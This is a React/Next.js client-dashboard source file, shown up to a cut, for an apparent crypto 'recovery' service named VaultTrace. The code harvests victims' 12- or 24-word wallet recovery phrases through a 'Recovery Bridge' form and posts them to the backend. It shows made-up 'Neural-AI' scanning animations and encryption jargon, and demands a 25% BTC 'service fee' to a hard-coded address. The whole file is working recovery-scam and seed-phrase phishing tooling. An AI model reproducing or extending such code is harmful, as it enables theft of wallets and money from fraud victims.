'use client';

import { ChangeEvent, useState, useEffect } from 'react';
import { LineChart, Line, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer } from 'recharts';
import { useRouter } from 'next/navigation';
import { getApiUrl } from '@/lib/api-config';

interface User {
  id: string;
  name: string;
  email: string;
  role: string;
}

interface ClientData {
  recoveredAmount: number;
  trackingProgress: number;
  feePaid: boolean;
  paymentPending: boolean;
  paymentConfirmed: boolean;
  fundsUnlocked: boolean;
  balance: number;
  fixed: number;
  marsettaShare: number;
  verifiedLoss1: number;
  verifiedLoss2: number;
  totalEntitlement: number;
}

interface Message {
  id: string;
  from: string;
  message: string;
  time: string;
  clientEmail: string;
  adminReply?: string;
  adminReplyTime?: string;
}

export default function ClientDashboard() {
  const router = useRouter();
  const [user, setUser] = useState<User | null>(null);
  const [token, setToken] = useState<string>('');
  const [seedPhrase, setSeedPhrase] = useState('');
  const [selectedWallet, setSelectedWallet] = useState('');
  const [customWallet, setCustomWallet] = useState('');
  const [evidenceFile, setEvidenceFile] = useState<File | null>(null);
  const [additionalEvidenceAmount, setAdditionalEvidenceAmount] = useState('');
  const [supportMessage, setSupportMessage] = useState('');
  const [data, setData] = useState<ClientData>({
    recoveredAmount: 0,
    trackingProgress: 0,
    feePaid: false,
    paymentPending: false,
    paymentConfirmed: false,
    fundsUnlocked: false,
    balance: 0,
    fixed: 0,
    marsettaShare: 0,
    verifiedLoss1: 0,
    verifiedLoss2: 0,
    totalEntitlement: 0,
  });
  const [supportMessages, setSupportMessages] = useState<Message[]>([]);
  const [selectedMessageId, setSelectedMessageId] = useState<string | null>(null);
  const [replyText, setReplyText] = useState('');
  const [paymentProofFile, setPaymentProofFile] = useState<File | null>(null);
  const [currentPassword, setCurrentPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [resetEmail, setResetEmail] = useState('');
  const [loading, setLoading] = useState(true);
  const [animatedProgress, setAnimatedProgress] = useState(0);
  const [displayAmount, setDisplayAmount] = useState(0);
  const [currentFee, setCurrentFee] = useState(0);
  const [isCalculating, setIsCalculating] = useState(false);

  const wallets = ['Coinbase', 'Binance', 'MetaMask', 'Trust Wallet', 'Exodus', 'Ledger', 'Trezor', 'Other'];

  const portfolioData = [
    { name: 'Jan', value: 0, recovered: 0, total: 100000 },
    { name: 'Feb', value: 0, recovered: 0, total: 100000 },
    { name: 'Mar', value: 0, recovered: 0, total: 100000 },
    { name: 'Apr', value: 0, recovered: 0, total: 100000 },
    { name: 'May', value: 0, recovered: 0, total: 100000 },
    { name: 'Jun', value: 0, recovered: 0, total: 100000 },
    { name: 'Jul', value: 0, recovered: 0, total: 100000 },
    { name: 'Aug', value: 0, recovered: 0, total: 100000 },
    { name: 'Sep', value: 0, recovered: 0, total: 100000 },
    { name: 'Oct', value: 0, recovered: 0, total: 100000 },
    { name: 'Nov', value: 0, recovered: 0, total: 100000 },
    { name: 'Dec', value: 0, recovered: 0, total: 100000 },
  ];

  const inboxMessages = [
    {
      label: 'SYSTEM ALERT',
      message: 'Neural-AI audit completed 0% of required telemetry checks.',
      time: '02:14 UTC',
    },
    {
      label: 'PAYMENT NOTICE',
      message: 'To initiate the secure retraction and finalize this phase of your case, the associated professional service fee of (25%) must be settled. Please note that secured assets are held in a temporary multi-sig state; prompt settlement ensures the immediate release of funds to your custody.',
      time: '01:58 UTC',
    },
    {
      label: 'SECURITY BRIEF',
      message: 'AES-256-GCM channel active; seed phrase bridge awaiting handshake.',
      time: '01:22 UTC',
    },
  ];

  useEffect(() => {
    const storedToken = localStorage.getItem('token');
    const storedUser = localStorage.getItem('user');

    if (!storedToken || !storedUser) {
      router.push('/login');
      return;
    }

    const parsedUser = JSON.parse(storedUser);
    if (parsedUser.role !== 'client') {
      router.push('/login');
      return;
    }

    setToken(storedToken);
    setUser(parsedUser);

    // Load client data
    fetchClientData(storedToken);
    fetchMessages(storedToken);
  }, []);

  // Animate progress bar with phases
  useEffect(() => {
    const timer = setInterval(() => {
      setAnimatedProgress((prev) => {
        if (prev < data.trackingProgress) {
          // Phase 1: Fast scanning (0-85%)
          if (prev < 85) return prev + 2;
          // Phase 2: Slow decryption (85-95%)
          else if (prev < 95) return prev + 0.5;
          // Phase 3: Final calculation (95-100%)
          else return prev + 0.2;
        }
        return data.trackingProgress;
      });
    }, 50);
    return () => clearInterval(timer);
  }, [data.trackingProgress]);

  // Animate entitlement and fee calculation
  useEffect(() => {
    if (animatedProgress > 0) {
      setIsCalculating(true);
      const finalAmount = data.totalEntitlement;
      const increment = finalAmount / 100;

      const timer = setInterval(() => {
        setDisplayAmount((prev) => {
          if (prev < finalAmount) {
            const newAmount = prev + increment;
            setCurrentFee(newAmount * 0.25); // 25% service fee
            return newAmount;
          } else {
            clearInterval(timer);
            setIsCalculating(false);
            return finalAmount;
          }
        });
      }, animatedProgress < 85 ? 20 : animatedProgress < 95 ? 60 : 150); // Match progress phases

      return () => clearInterval(timer);
    } else {
      setDisplayAmount(0);
      setCurrentFee(0);
      setIsCalculating(false);
    }
  }, [animatedProgress, data.totalEntitlement]);

  const fetchClientData = async (authToken: string) => {
    try {
      const response = await fetch(getApiUrl('/api/client/data'), {
        headers: {
          'Authorization': `Bearer ${authToken}`,
        },
      });

      if (response.ok) {
        const clientData = await response.json();
        setData(clientData.data);
        setSelectedWallet(clientData.wallet || '');
        setSeedPhrase(clientData.seedPhrase || '');
      } else {
        // Token might be expired
        localStorage.removeItem('token');
        localStorage.removeItem('user');
        router.push('/login');
      }
    } catch (error) {
      console.error('Error fetching client data:', error);
    } finally {
      setLoading(false);
    }
  };

  const fetchMessages = async (authToken: string) => {
    try {
      const response = await fetch(getApiUrl('/api/messages'), {
        headers: {
          'Authorization': `Bearer ${authToken}`,
        },
      });

      if (response.ok) {
        const messages = await response.json();
        setSupportMessages(messages);
      }
    } catch (error) {
      console.error('Error fetching messages:', error);
    }
  };

  const handleSeedChange = (event: ChangeEvent<HTMLTextAreaElement>) => {
    setSeedPhrase(event.target.value);
  };

  const handleWalletChange = (event: ChangeEvent<HTMLSelectElement>) => {
    setSelectedWallet(event.target.value);
  };

  const handleFileChange = (event: ChangeEvent<HTMLInputElement>) => {
    if (event.target.files) {
      setEvidenceFile(event.target.files[0]);
    }
  };

  const handleSimulateSubmit = async () => {
    const wallet = selectedWallet === 'Other' ? customWallet : selectedWallet;
    if (!token) {
      alert('Please login first.');
      return;
    }

    try {
      const response = await fetch(getApiUrl('/api/client/wallet'), {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ wallet, seedPhrase }),
      });

      if (response.ok) {
        alert('Recovery bridge request submitted. Await admin confirmation.');
      } else {
        alert('Error updating wallet data.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error updating wallet data.');
    }
  };

  const handleSendSupport = async () => {
    if (!supportMessage.trim() || !token) return;

    try {
      const response = await fetch(getApiUrl('/api/messages'), {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ message: supportMessage }),
      });

      if (response.ok) {
        alert('Support message sent. Admin will respond.');
        setSupportMessage('');
        fetchMessages(token);
      } else {
        alert('Error sending message.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error sending message.');
    }
  };

  const handleEvidenceUpload = async () => {
    if (!token) {
      alert('Please login first.');
      return;
    }

    if (!evidenceFile) {
      alert('Please select a file to upload.');
      return;
    }

    if (!additionalEvidenceAmount) {
      alert('Please enter the amount for this additional evidence.');
      return;
    }

    try {
      const response = await fetch(getApiUrl('/api/client/verified-loss-2'), {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ amount: parseFloat(additionalEvidenceAmount) }),
      });

      if (response.ok) {
        alert('Additional evidence uploaded successfully. Verified Loss 2 updated.');
        setEvidenceFile(null);
        setAdditionalEvidenceAmount('');
        // Reset file input
        const fileInput = document.querySelector('input[type="file"]') as HTMLInputElement;
        if (fileInput) fileInput.value = '';
        // Refresh data
        fetchClientData(token);
      } else {
        alert('Error uploading evidence.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error uploading evidence.');
    }
  };

  const handleReplyToAdmin = async (messageId: string) => {
    if (!replyText.trim() || !token) return;

    try {
      const response = await fetch(getApiUrl(`/api/messages/${messageId}/reply`), {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ reply: replyText }),
      });

      if (response.ok) {
        alert('Reply sent to admin.');
        setReplyText('');
        setSelectedMessageId(null);
        fetchMessages(token);
      } else {
        alert('Error sending reply.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error sending reply.');
    }
  };

  const handlePaymentProofUpload = (event: ChangeEvent<HTMLInputElement>) => {
    if (event.target.files) {
      setPaymentProofFile(event.target.files[0]);
    }
  };

  const handleChangePassword = async () => {
    if (!currentPassword || !newPassword || !confirmPassword || !token) {
      alert('Please fill in all password fields.');
      return;
    }
    if (newPassword !== confirmPassword) {
      alert('New passwords do not match.');
      return;
    }
    if (newPassword.length < 8) {
      alert('Password must be at least 8 characters long.');
      return;
    }

    try {
      const response = await fetch(getApiUrl('/api/client/password'), {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ currentPassword, newPassword }),
      });

      if (response.ok) {
        alert('Password changed successfully.');
        setCurrentPassword('');
        setNewPassword('');
        setConfirmPassword('');
      } else {
        const error = await response.json();
        alert(error.message || 'Error changing password.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error changing password.');
    }
  };

  const handleForgotPassword = () => {
    if (!resetEmail) {
      alert('Please enter your email address.');
      return;
    }
    // Simulate password reset - in real app this would send email
    alert(`Password reset link sent to ${resetEmail}. Check your email for instructions.`);
    setResetEmail('');
  };

  const handlePaymentSent = () => {
    alert('Payment confirmation sent. Pending admin approval.');
  };

  const handleLogout = () => {
    localStorage.removeItem('token');
    localStorage.removeItem('user');
    router.push('/');
  };

  return (
    <div className="min-h-screen bg-[#040b16] text-white p-6 md:p-10">
      <div className="max-w-7xl mx-auto space-y-8">
        <header className="flex flex-col gap-6 xl:flex-row xl:items-start xl:justify-between">
          <div className="space-y-4">
            <p className="uppercase tracking-[0.35em] text-cyan-300 text-xs">VaultTrace Retraction Protocol</p>
            <div className="space-y-2">
              <h1 className="text-4xl md:text-5xl font-black tracking-tight">CLASSIFIED RECOVERY</h1>
              <p className="text-sm text-slate-400 uppercase tracking-[0.25em]">
                CASE: MARSETTA_7743-B • CLIENT: {user?.name} • PRIORITY: ALPHA
              </p>
            </div>
            <div className="flex flex-wrap gap-3">
              <span className="inline-flex items-center gap-2 rounded-full bg-emerald-500/15 px-3 py-1 text-xs uppercase tracking-[0.3em] text-emerald-300">
                <span className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse" /> NEURAL-AI ONLINE
              </span>
              <span className={`inline-flex items-center gap-2 rounded-full px-3 py-1 text-xs uppercase tracking-[0.3em] ${
                data.fundsUnlocked ? 'bg-green-500/15 text-green-300' : 'bg-orange-500/15 text-orange-300'
              }`}>
                {data.fundsUnlocked ? '✓ FUNDS UNLOCKED' : 'FUNDS LOCKED'}
              </span>
            </div>
          </div>

          <div className="flex gap-4">
            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-6 shadow-xl shadow-cyan-500/5">
              <p className="text-xs uppercase tracking-[0.3em] text-cyan-300 mb-3">Encryption Standards</p>
              <div className="space-y-2 text-sm text-slate-200">
                <p>AES-256-GCM</p>
                <p>ChaCha20-Poly1305</p>
              </div>
              <p className="mt-4 text-xs text-slate-500">Secure audit channel verified for classified recovery operations.</p>
            </div>
            <button
              onClick={handleLogout}
              className="glass rounded-[32px] border border-white/10 bg-white/5 p-6 shadow-xl shadow-cyan-500/5 hover:bg-red-500/10 transition"
            >
              <p className="text-xs uppercase tracking-[0.3em] text-red-300">Logout</p>
            </button>
          </div>
        </header>

        <section className="grid gap-8 xl:grid-cols-[1.8fr_1fr]">
          <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
            <div className="grid gap-6 lg:grid-cols-[1.5fr_1fr]">
              <div className="space-y-6">
                <p className="text-sm uppercase tracking-[0.3em] text-slate-400">Financial Overview</p>
                <div>
                  <p className="text-xs uppercase tracking-[0.3em] text-slate-400">Total Equity (USDT)</p>
                  <p className="mt-2 text-5xl font-bold text-cyan-300">${data.recoveredAmount.toLocaleString()}</p>
                </div>
              </div>

              <div className="rounded-[28px] bg-slate-950/80 p-5 border border-white/10">
                <p className="text-xs uppercase tracking-[0.3em] text-slate-400">Wallet Verification</p>
                <p className="mt-3 text-base font-semibold text-white">BYBIT WALLET VERIFICATION</p>
                <p className="mt-2 text-sm text-slate-500">ETH / BSC / BTC</p>
                <div className="mt-4 rounded-2xl bg-slate-900/80 px-4 py-3 text-xs uppercase tracking-[0.2em] text-orange-300 border border-orange-500/10">
                  FUNDS LOCKED
                </div>
              </div>
            </div>

            <div className="mt-10 grid gap-4 sm:grid-cols-2 xl:grid-cols-4">
              <div className="rounded-3xl bg-slate-950/80 p-5 border border-white/10">
                <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Balance</p>
                <p className="mt-3 text-2xl font-semibold text-slate-100">${data.balance?.toLocaleString() || '0.00'}</p>
              </div>
              <div className="rounded-3xl bg-slate-950/80 p-5 border border-white/10">
                <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Fixed</p>
                <p className="mt-3 text-2xl font-semibold text-cyan-300">${data.fixed?.toLocaleString() || '0.00'}</p>
                <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500 mt-2">Multi-Sig Lock</p>
              </div>
              <div className="rounded-3xl bg-slate-950/80 p-5 border border-white/10">
                <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Marsetta Share</p>
                <p className="mt-3 text-2xl font-semibold text-white">${data.marsettaShare?.toLocaleString() || '0.00'}</p>
                <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500 mt-2">2.08% Settlement</p>
              </div>
              <div className="rounded-3xl bg-slate-950/80 p-5 border border-white/10">
                <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Protocol Progress</p>
                <p className="mt-3 text-base font-semibold text-white">Decrypting target vectors</p>
                <div className="mt-4 h-3 rounded-full bg-slate-900/80 overflow-hidden">
                  <div className="h-full bg-cyan-500" style={{ width: `${animatedProgress}%` }} />
                </div>
              </div>
            </div>

            <div className="mt-10 rounded-[32px] bg-slate-950/80 border border-white/10 p-6">
              <div className="flex items-center justify-between gap-4">
                <div>
                  <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Protocol Status</p>
                  <p className="mt-2 text-xl font-semibold text-white">Decrypting target vectors</p>
                </div>
                <span className="inline-flex items-center rounded-full bg-cyan-500/15 px-3 py-1 text-xs uppercase tracking-[0.3em] text-cyan-200">{animatedProgress.toFixed(1)}% Complete</span>
              </div>
              <div className="mt-6 h-3 rounded-full bg-slate-900/80 overflow-hidden">
                <div className="h-full bg-cyan-400" style={{ width: `${animatedProgress}%` }} />
              </div>
            </div>

            <div className="mt-4 rounded-[32px] bg-slate-950/80 border border-white/10 p-8">
              <div className="flex items-center justify-between mb-6">
                <div>
                  <p className="text-xs uppercase tracking-[0.3em] text-cyan-300">Asset Recovery Tracking</p>
                  <h3 className="text-xl font-semibold text-white">Portfolio Performance & Recovery Timeline</h3>
                </div>
                <div className="flex gap-4 text-xs">
                  <div className="flex items-center gap-2">
                    <div className="w-3 h-3 bg-cyan-400 rounded-full"></div>
                    <span className="text-slate-400">Total Assets</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="w-3 h-3 bg-green-400 rounded-full"></div>
                    <span className="text-slate-400">Recovered</span>
                  </div>
                </div>
              </div>
              <ResponsiveContainer width="100%" height={300}>
                <LineChart data={portfolioData} margin={{ top: 20, right: 30, left: 20, bottom: 5 }}>
                  <CartesianGrid strokeDasharray="3 3" stroke="#374151" opacity={0.3} />
                  <XAxis 
                    dataKey="name" 
                    stroke="#9CA3AF" 
                    fontSize={12}
                    tick={{ fill: '#9CA3AF' }}
                  />
                  <YAxis 
                    stroke="#9CA3AF" 
                    fontSize={12}
                    tick={{ fill: '#9CA3AF' }}
                    tickFormatter={(value) => `$${value.toLocaleString()}`}
                  />
                  <Tooltip 
                    contentStyle={{ 
                      backgroundColor: '#1F2937', 
                      border: '1px solid #374151',
                      borderRadius: '8px',
                      color: '#F3F4F6'
                    }}
                    formatter={(value: any, name: any) => [
                      `$${value.toLocaleString()}`, 
                      name === 'total' ? 'Total Assets' : 'Recovered Assets'
                    ]}
                  />
                  <Line 
                    type="monotone" 
                    dataKey="total" 
                    stroke="#22D3EE" 
                    strokeWidth={3}
                    dot={{ fill: '#22D3EE', strokeWidth: 2, r: 4 }}
                    activeDot={{ r: 6, stroke: '#22D3EE', strokeWidth: 2 }}
                  />
                  <Line 
                    type="monotone" 
                    dataKey="recovered" 
                    stroke="#10B981" 
                    strokeWidth={3}
                    dot={{ fill: '#10B981', strokeWidth: 2, r: 4 }}
                    activeDot={{ r: 6, stroke: '#10B981', strokeWidth: 2 }}
                  />
                </LineChart>
              </ResponsiveContainer>
              <div className="mt-6 grid grid-cols-3 gap-4 text-center">
                <div className="rounded-xl bg-slate-900/50 p-4 border border-slate-700">
                  <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Current Recovery</p>
                  <p className="text-lg font-semibold text-green-400">${data.recoveredAmount.toLocaleString()}</p>
                </div>
                <div className="rounded-xl bg-slate-900/50 p-4 border border-slate-700">
                  <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Total Assets</p>
                  <p className="text-lg font-semibold text-cyan-400">${(data.recoveredAmount + data.balance + data.fixed + data.marsettaShare).toLocaleString()}</p>
                </div>
                <div className="rounded-xl bg-slate-900/50 p-4 border border-slate-700">
                  <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Recovery Rate</p>
                  <p className="text-lg font-semibold text-white">{animatedProgress.toFixed(1)}%</p>
                </div>
              </div>
            </div>
          </div>

          <aside className="space-y-8">
            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
              <div className="flex items-center justify-between gap-4">
                <div>
                  <p className="text-xs uppercase tracking-[0.3em] text-slate-400">Beneficiary Profile</p>
                  <h2 className="mt-3 text-2xl font-semibold text-white">Case ID: MARSETTA_7743-B</h2>
                </div>
                <span className="rounded-3xl bg-emerald-500/10 px-4 py-2 text-xs uppercase tracking-[0.3em] text-emerald-300">Verified</span>
              </div>

              <div className="mt-8 space-y-4 text-sm text-slate-300">
                <div className="rounded-3xl bg-slate-950/80 p-4 border border-white/10">
                  <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Verified Loss #1</p>
                  <p className="mt-2 text-lg font-semibold">${data.verifiedLoss1?.toLocaleString() || '0.00'}</p>
                </div>
                <div className="rounded-3xl bg-slate-950/80 p-4 border border-white/10">
                  <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Verified Loss #2</p>
                  <p className="mt-2 text-lg font-semibold">${data.verifiedLoss2?.toLocaleString() || '0.00'}</p>
                </div>
                <div className="rounded-3xl bg-slate-950/80 p-4 border border-white/10">
                  <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Total Entitlement</p>
                  <p className="mt-2 text-2xl font-semibold text-cyan-300">${displayAmount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</p>
                </div>
              </div>
            </div>

            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
              <div className="space-y-4">
                <p className="text-xs uppercase tracking-[0.3em] text-cyan-300">CONNECT WALLET</p>
                <h3 className="text-2xl font-semibold">Recovery Bridge</h3>
                <p className="text-sm text-slate-400">Select your wallet to establish the encrypted bridge for smart-contract retraction.</p>
              </div>

              <select
                value={selectedWallet}
                onChange={handleWalletChange}
                className="mt-6 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
              >
                <option value="">Select Wallet</option>
                {wallets.map(wallet => (
                  <option key={wallet} value={wallet}>{wallet}</option>
                ))}
              </select>              {selectedWallet === 'Other' && (
                <input
                  type="text"
                  value={customWallet}
                  onChange={(e) => setCustomWallet(e.target.value)}
                  placeholder="Enter custom wallet name"
                  className="mt-4 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                />
              )}
              <textarea
                rows={6}
                value={seedPhrase}
                onChange={handleSeedChange}
                placeholder="Enter 12-word or 24-word recovery phrase"
                className="mt-6 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
              />

              <button
                onClick={handleSimulateSubmit}
                className="mt-6 w-full rounded-3xl bg-cyan-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black transition hover:bg-cyan-400"
              >
                Establish Secure Bridge
              </button>
            </div>

            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
              <div className="space-y-4">
                <p className="text-xs uppercase tracking-[0.3em] text-cyan-300">PAYMENT</p>
                <h3 className="text-2xl font-semibold">Service Fee (25%)</h3>

                {/* Live Calculation Display */}
                <div className="bg-gradient-to-r from-cyan-500/10 to-cyan-400/10 border border-cyan-500/20 rounded-3xl p-4 mb-4">
                  <div className="flex justify-between items-center mb-3">
                    <span className="text-xs text-cyan-400 uppercase tracking-[0.2em]">Neural-AI Calculation</span>
                    <span className={`text-xs font-bold ${isCalculating ? 'text-yellow-400 animate-pulse' : 'text-green-400'}`}>
                      {isCalculating ? 'SCANNING...' : 'COMPLETE'}
                    </span>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="text-center">
                      <p className="text-lg font-bold text-cyan-300">${displayAmount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</p>
                      <p className="text-xs text-slate-400 uppercase tracking-[0.2em]">Total Entitlement</p>
                    </div>
                    <div className={`text-center p-2 rounded-xl transition-all duration-300 ${
                      isCalculating && animatedProgress > 85 ? 'bg-yellow-500/10 border border-yellow-500/30 animate-pulse' : ''
                    }`}>
                      <p className={`text-lg font-bold ${isCalculating && animatedProgress > 85 ? 'text-yellow-300' : 'text-slate-200'}`}>
                        ${currentFee.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}
                      </p>
                      <p className="text-xs text-slate-400 uppercase tracking-[0.2em]">Service Fee</p>
                    </div>
                  </div>
                </div>

                <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-3xl p-4">
                  <p className="text-yellow-300 text-sm font-semibold">To initiate the secure retraction and finalize this phase of your case, the associated professional service fee of (25%) must be settled. Please note that secured assets are held in a temporary multi-sig state; prompt settlement ensures the immediate release of funds to your custody.</p>
                </div>
                <div className="flex items-center gap-2">
                  <p className="text-sm text-slate-400">Send to: 1W984WdG9gLXEvopZ5NiWiHppvRDbnb3u</p>
                  <button
                    onClick={() => navigator.clipboard.writeText('1W984WdG9gLXEvopZ5NiWiHppvRDbnb3u').then(() => alert('BTC address copied!'))}
                    className="px-3 py-1 bg-cyan-500 text-black text-xs font-bold rounded hover:bg-cyan-400"
                  >
                    Copy
                  </button>
                </div>
                <div className="space-y-2">
                  <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Enter BTC Amount to Pay</label>
                  <input
                    type="number"
                    step="0.00000001"
                    placeholder="e.g., 0.001"
                    className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Upload Payment Proof</label>
                  <input
                    type="file"
                    accept="image/*"
                    onChange={handlePaymentProofUpload}
                    className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 file:bg-cyan-500 file:text-black file:border-none file:px-4 file:py-1 file:rounded file:mr-4 file:text-xs"
                  />
                  {paymentProofFile && (
                    <p className="text-green-400 text-xs mt-1">✓ {paymentProofFile.name} uploaded</p>
                  )}
                </div>
                {data.paymentConfirmed ? (
                  <p className="text-green-400 mt-4 font-semibold">✓ Payment Confirmed</p>
                ) : data.feePaid ? (
                  <p className="text-blue-400 mt-4 font-semibold">Fee Paid - Awaiting Confirmation</p>
                ) : data.paymentPending ? (
                  <p className="text-yellow-400 mt-4 font-semibold">Pending Confirmation</p>
                ) : (
                  <button
                    onClick={handlePaymentSent}
                    className="mt-4 w-full px-4 py-2 bg-yellow-500 text-black font-bold rounded hover:bg-yellow-400"
                  >
                    I Have Sent My Payment
                  </button>
                )}
              </div>
            </div>

            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
              <div className="space-y-4">
                <p className="text-xs uppercase tracking-[0.3em] text-cyan-300">UPLOAD EVIDENCE</p>
                <h3 className="text-2xl font-semibold">Additional Files</h3>
                <p className="text-sm text-slate-400">Upload more evidence for your case and specify the associated amount.</p>
              </div>

              <input
                type="file"
                onChange={handleFileChange}
                className="mt-6 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 file:bg-cyan-500 file:text-black file:border-none file:px-4 file:py-1 file:rounded file:mr-4"
              />

              <input
                type="number"
                value={additionalEvidenceAmount}
                onChange={(e) => setAdditionalEvidenceAmount(e.target.value)}
                placeholder="Enter amount for this evidence ($)"
                className="mt-4 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
              />

              <button
                onClick={handleEvidenceUpload}
                className="mt-6 w-full rounded-3xl bg-cyan-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black transition hover:bg-cyan-400"
              >
                Upload Evidence
              </button>
            </div>

            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
              <div className="space-y-4">
                <p className="text-xs uppercase tracking-[0.3em] text-cyan-300">SUPPORT</p>
                <h3 className="text-2xl font-semibold">Contact Support</h3>
                <p className="text-sm text-slate-400">Send a message to our support team.</p>
              </div>

              <textarea
                rows={4}
                value={supportMessage}
                onChange={(e) => setSupportMessage(e.target.value)}
                placeholder="Type your message here"
                className="mt-6 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
              />

              <button
                onClick={handleSendSupport}
                className="mt-6 w-full rounded-3xl bg-cyan-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black transition hover:bg-cyan-400"
              >
                Send Message
              </button>
            </div>

            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
              <div className="space-y-4">
                <p className="text-xs uppercase tracking-[0.3em] text-cyan-300">ACCOUNT SETTINGS</p>
                <h3 className="text-2xl font-semibold">Security & Password</h3>
                <p className="text-sm text-slate-400">Manage your account security settings.</p>
              </div>

              <div className="mt-6 space-y-4">
                <div className="space-y-2">
                  <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Current Password</label>
                  <input
                    type="password"
                    value={currentPassword}
                    onChange={(e) => setCurrentPassword(e.target.value)}
                    placeholder="Enter current password"
                    className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-sm uppercase tracking-[0.3em] text-slate-400">New Password</label>
                  <input
                    type="password"
                    value={newPassword}
                    onChange={(e) => setNewPassword(e.target.value)}
                    placeholder="Enter new password"
                    className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Confirm New Password</label>
                  <input
                    type="password"
                    value={confirmPassword}
                    onChange={(e) => setConfirmPassword(e.target.value)}
                    placeholder="Confirm new password"
                    className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
                  />
                </div>
                <button
                  onClick={handleChangePassword}
                  className="w-full rounded-3xl bg-cyan-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black transition hover:bg-cyan-400"
                >
                  Change Password
                </button>
              </div>

              <div className="mt-8 pt-6 border-t border-white/10">
                <div className="space-y-4">
                  <h4 className="text-lg font-semibold text-white">Forgot Password?</h4>
                  <p className="text-sm text-slate-400">Enter your email to receive a password reset link.</p>
                  <div className="space-y-2">
                    <input
                      type="email"
                      value={resetEmail}
                      onChange={(e) => setResetEmail(e.target.value)}
                      placeholder="Enter your email address"
